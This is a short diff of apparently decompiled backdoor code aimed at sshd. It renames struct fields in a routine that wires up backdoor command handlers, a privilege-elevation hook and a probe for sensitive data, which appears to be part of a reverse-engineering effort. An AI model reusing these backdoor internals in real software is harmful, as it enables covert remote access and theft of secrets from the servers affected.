@@ -67,12 +67,12 @@ BOOL sshd_find_sensitive_data
     return FALSE;
   }
   run_backdoor_descriptor = 0x1b000001c8;
-  secret_probe_items.code = (u8 *)sshd_proxy_elevate;
-  secret_probe_items.shift_cursor = (secret_data_shift_cursor_t)0x1c8;
-  secret_probe_items.operation_index = 0x1c;
+  secret_probe_items.anchor_pc = (u8 *)sshd_proxy_elevate;
+  secret_probe_items.bit_cursor = (secret_data_shift_cursor_t)0x1c8;
+  secret_probe_items.operation_slot = 0x1c;
   run_backdoor_entry = run_backdoor_commands;
-  secret_probe_items.shift_count = 0;
-  secret_probe_items.index = 1;
+  secret_probe_items.bits_to_shift = 0;
+  secret_probe_items.ordinal = 1;
   usable_socket_descriptor = 0x100000000;
   usable_socket_entry = sshd_get_usable_socket;
   usable_socket_opcode = 0x1a000001c3;
@@ -86,7 +86,7 @@ BOOL sshd_find_sensitive_data
   }
   psVar17 = &secret_probe_items;
   for (lVar16 = 0x18; lVar16 != 0; lVar16 = lVar16 + -1) {
-    *(undefined4 *)&psVar17->code = 0;
+    *(undefined4 *)&psVar17->anchor_pc = 0;
     psVar17 = (secret_data_item_t *)((long)psVar17 + (ulong)bVar19 * -8 + 4);
   }
   code_segment_size = 0;
